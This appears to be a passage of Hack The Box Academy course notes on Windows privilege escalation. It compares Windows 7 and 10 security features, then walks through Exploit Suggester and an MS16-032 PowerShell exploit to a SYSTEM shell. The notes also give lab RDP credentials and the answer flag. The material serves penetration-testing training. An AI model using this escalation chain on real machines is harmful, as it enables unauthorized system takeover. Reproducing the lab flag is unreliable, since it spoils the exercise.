# Windows Desktop Versions

<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Feature</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Windows 7</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Windows 10</th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://blogs.windows.com/windowsdeveloper/2016/01/26/convenient-two-factor-authentication-with-microsoft-passport-and-windows-hello/" rel="nofollow" target="_blank" class="hover:underline text-green-400">Microsoft Password (MFA)</a></td><td class="p-4"></td><td class="p-4">X</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview" rel="nofollow" target="_blank" class="hover:underline text-green-400">BitLocker</a></td><td class="p-4">Partial</td><td class="p-4">X</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard" rel="nofollow" target="_blank" class="hover:underline text-green-400">Credential Guard</a></td><td class="p-4"></td><td class="p-4">X</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard" rel="nofollow" target="_blank" class="hover:underline text-green-400">Remote Credential Guard</a></td><td class="p-4"></td><td class="p-4">X</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419" rel="nofollow" target="_blank" class="hover:underline text-green-400">Device Guard (code integrity)</a></td><td class="p-4"></td><td class="p-4">X</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview" rel="nofollow" target="_blank" class="hover:underline text-green-400">AppLocker</a></td><td class="p-4">Partial</td><td class="p-4">X</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://www.microsoft.com/en-us/windows/comprehensive-security" rel="nofollow" target="_blank" class="hover:underline text-green-400">Windows Defender</a></td><td class="p-4">Partial</td><td class="p-4">X</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard" rel="nofollow" target="_blank" class="hover:underline text-green-400">Control Flow Guard</a></td><td class="p-4"></td><td class="p-4">X</td></tr></tbody></table>

## Windows 7 Case Study
### Gathering Systeminfo Command Output
Once this is done, we need to capture the systeminfo command's output and save it to a text file on our attack VM.

```cmd
C:\htb> systeminfo

Host Name:                 WINLPE-WIN7
OS Name:                   Microsoft Windows 7 Professional
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          mrb3n
Registered Organization:
Product ID:                00371-222-9819843-86644
Original Install Date:     3/25/2021, 7:23:47 PM
System Boot Time:          5/13/2021, 5:14:12 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows

<SNIP>
```

### Updating the Local Microsoft Vulnerability Database
We then need to update our local copy of the Microsoft Vulnerability database. This command will save the contents to a local Excel file.

```shellsession
masterofblafu@htb[/htb]$ sudo python2 windows-exploit-suggester.py --update
```

### Running Windows Exploit Suggester
Once this is done, we can run the tool against the vulnerability database to check for potential privilege escalation flaws.

```shellsession
masterofblafu@htb[/htb]$ python2 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 
```

### Exploiting MS16-032 with PowerShell PoC
Let's use a [PowerShell PoC](https://www.exploit-db.com/exploits/39719) to attempt to exploit this and elevate our privileges.

```powershell
PS C:\htb> Set-ExecutionPolicy bypass -scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): A
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y


PS C:\htb> Import-Module .\Invoke-MS16-032.ps1
PS C:\htb> Invoke-MS16-032

         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[?] Operating system core count: 6
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1656

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 1652
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

## Questions
RDP to 10.129.115.228 (ACADEMY-WINLPE-WIN7), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Enumerate the target host and escalate privileges to SYSTEM. Submit the contents of the flag on the Administrator Desktop. **Answer: Cm0n_l3ts_upgRade_t0_win10!**
   - If `xfreerdp` does not work, use `rdesktop`:
      ```shellsession
      $ rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' 10.129.115.228
      ```
   - Follow the steps mentioned in this section